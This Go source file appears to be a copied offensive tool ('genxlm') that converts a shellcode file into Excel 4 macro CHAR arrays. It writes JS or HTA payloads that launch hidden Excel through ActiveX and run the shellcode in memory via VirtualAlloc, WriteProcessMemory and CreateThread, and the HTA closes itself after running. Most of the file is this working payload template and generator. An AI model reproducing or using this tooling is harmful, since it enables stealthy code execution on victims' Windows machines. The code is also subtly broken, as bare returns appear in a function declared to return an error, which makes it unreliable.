package genxlm

/*
  * Stollen from https://github.com/med0x2e/genxlm
*/
import (
	"fmt"
	"os"
	"bufio"
	"flag"
	"strings"
)

func genJS(_shVar string) string{
_js := `
var excelObj = new ActiveXObject("Excel.Application");
excelObj.visible = false;
%SHByteArray%
var addr = excelObj.ExecuteExcel4Macro('CALL("Kernel32","VirtualAlloc","JJJJJ",0,' + _shArr.length + ',4096,64)')
var i = 0;
for (i = 0; i < _shArr.length; i++) {
  var ret = excelObj.ExecuteExcel4Macro('CALL("Kernel32","WriteProcessMemory","JJJCJJ",-1, ' + (addr + i) + ',' + _shArr[i] + ', 1, 0)')
}
excelObj.ExecuteExcel4Macro('CALL("Kernel32","CreateThread","JJJJJJJ",0, 0, ' + addr + ', 0, 0, 0)')
`
	_js = strings.ReplaceAll(_js, "%SHByteArray%", _shVar)
	return _js
}

func genHTA(_shVar string) string{
	_hta := `
<html>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<HTA:APPLICATION ID="test" WINDOWSTATE="minimize">
<head>
	<title>Test HTA</title>
	<meta charset="utf-8">
	<meta http-equiv="x-ua-compatible" content="ie=9">
	<script language="JScript">
	  var excelObj = new ActiveXObject("Excel.Application");
	  excelObj.visible = false;
	  %SHByteArray%
	  var addr = excelObj.ExecuteExcel4Macro('CALL("Kernel32","VirtualAlloc","JJJJJ",0,' + _shArr.length + ',4096,64)')
	  var i = 0;
	  for (i = 0; i < _shArr.length; i++) {
		var ret = excelObj.ExecuteExcel4Macro('CALL("Kernel32","WriteProcessMemory","JJJCJJ",-1, ' + (addr + i) + ',' + _shArr[i] + ', 1, 0)')
	  }
	  excelObj.ExecuteExcel4Macro('CALL("Kernel32","CreateThread","JJJJJJJ",0, 0, ' + addr + ', 0, 0, 0)')

      //uncomment if you want to close the HTA window after execution.
      self.close();
	</script>
</head>
</html>
	`
	_hta = strings.ReplaceAll(_hta, "%SHByteArray%", _shVar)
	return _hta
}

func isSet(name string) bool {
	found := false
	flag.Visit(func(f *flag.Flag) {
		if f.Name == name {
			found = true
		}
	})
	return found
}

func usage() {
	fmt.Fprintf(os.Stderr, "Usage of genXLM.go:\n")
	flag.PrintDefaults()
	println()
}

type GenXlm struct{
  Name,Wsh,Out string
}

func (gx *GenXlm) Xlmgenenerate() error{
	shFileName := ""
	wsh := ""
	out := ""

	flag.StringVar(&shFileName, "sh", "", "Shellcode file path, ex: go run genXLM.go -sh shellcode.bin")
	flag.StringVar(&wsh, "wsh", "", "payload template js/hta, ex: go run genXLM.go -sh shellcode.bin -wsh js")
	flag.StringVar(&out, "o", "", "output payload filename")
	flag.Parse()

	flag.Usage = usage

	if !isSet("sh"){
		flag.Usage()
		return
	}


	if _, err := os.Stat(gx.Name); os.IsNotExist(err) {
		return
	}

	isGen := false
	if isSet("wsh"){
		if wsh == "js" || wsh == "hta" {
			isGen = true
		}else{
			fmt.Println("[-]: use js/hta options")
			return
		}
	}

	shFile, err := os.Open(shFileName)
	if err != nil {
		fmt.Println(err)
		return
	}

	defer shFile.Close()

	meta, err := shFile.Stat()
	if err != nil {
		fmt.Println(err)
		return
	}

	var size int64 = meta.Size()
	shBytes := make([]byte, size)

	buf := bufio.NewReader(shFile)
	_,err = buf.Read(shBytes)

	i := 0


	charArray:= "var _shArr = ["
	fmt.Println("[*]: Generating byte array XLM shellcode ...")
	for _, aByte := range shBytes{
		charArray = charArray + fmt.Sprintf("\"CHAR(%d)\"", int(aByte))

		if i != (int(size) - 1) {
			charArray = charArray + ","
		}
		i++
	}
	charArray = charArray + "];"

	fmt.Println("[*]: Byte array length is", size)
	content := ""

	if !isGen{
		fmt.Println("[*]: XLM format: ")
		fmt.Println(charArray)
	}else{
		fmt.Println("[*]: Generating", wsh, "Payload ...")
		if wsh == "js"{
			content = genJS(charArray)
		}else{
			content = genHTA(charArray)
		}
		outputFName := "output"
		if isSet("o"){
			outputFName = out
		}

		outputFile, err := os.Create(outputFName+"."+wsh)
		if err != nil {
			panic(err)
		}
		defer outputFile.Close()

		outputFile.WriteString(content)

		fmt.Println("[*]: File",outputFile.Name(), "generated.")
	}


}
